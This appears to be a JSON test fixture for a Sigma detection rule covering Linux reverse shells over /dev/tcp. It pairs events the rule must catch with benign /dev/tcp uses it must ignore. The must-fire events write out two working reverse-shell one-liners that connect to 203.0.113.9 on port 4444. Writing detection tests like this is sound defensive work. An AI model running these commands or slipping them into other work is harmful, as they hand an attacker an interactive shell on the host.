  {
    "id": "linux_reverse_shell_devtcp",
    "file": "rules/sigma/linux_reverse_shell_devtcp.yml",
    "must_fire": [
      [
        {
          "class": "process_exec",
          "process": "bash",
          "cmdline": "bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'",
          "parent": "bash"
        }
      ],
      [
        {
          "class": "process_exec",
          "process": "sh",
          "cmdline": "sh -c '0<&196;exec 196<>/dev/tcp/203.0.113.9/4444; sh <&196 >&196 2>&196'",
          "parent": "bash"
        }
      ]
    ],
    "must_not_fire": [
      [
        {
          "class": "process_exec",
          "process": "bash",
          "cmdline": "bash -c 'echo > /dev/tcp/db/5432'",
          "parent": "bash"
        }
      ],
      [
        {
          "class": "process_exec",
          "process": "bash",
          "cmdline": "bash -i",
          "parent": "dockerd"
        }
      ],
      [
        {
          "class": "process_exec",
          "process": "bash",
          "cmdline": "bash -c 'cat < /dev/tcp/127.0.0.1/80'",
          "parent": "bash"
        }
      ],
      [
        {
          "class": "process_exec",
          "process": "bash",
          "cmdline": "bash -c 'cat <&0 >&1'"
        }
      ]
    ]
  },
